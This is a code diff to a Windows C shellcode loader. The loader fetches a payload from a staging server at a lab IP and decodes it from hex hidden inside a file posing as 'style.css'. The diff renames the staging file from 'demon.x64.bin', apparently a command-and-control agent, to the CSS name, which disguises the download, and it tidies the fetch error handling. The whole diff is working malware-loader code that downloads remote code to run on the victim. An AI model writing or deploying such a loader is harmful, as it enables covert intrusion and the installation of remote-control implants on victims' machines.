@@ -3,7 +3,7 @@
 #include <wininet.h>
 #pragma comment(lib, "wininet.lib");
 
-#define STAGINGURL L"http://192.168.56.130:8080/demon.x64.bin"
+#define STAGINGURL L"http://192.168.56.130:8080/style.css"
 
 BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
     BYTE * payload = NULL;
@@ -150,12 +150,15 @@ int main(void) {
     SIZE_T cssFileSize = 0;
     BYTE * decodedPayload = NULL;
     BYTE * encodedPayloadBuf = NULL;
-    DWORD bytesRead = NULL;
     SIZE_T decodedPayloadSize = 0;
-    DWORD oldProt = NULL;
 
-    if (!FetchCSS(STAGINGURL, &cssFile, &cssFileSize || cssFileSize == 0)) {
+    if (!FetchCSS(STAGINGURL, &cssFile, &cssFileSize)) {
         printf("[!] Error fetching CSS file.\n");
+        goto _EndOfFunc;
+    }
+
+    if (cssFileSize == 0) {
+        printf("[!] CSS file no content.\n");
         goto _EndOfFunc;
     }
 
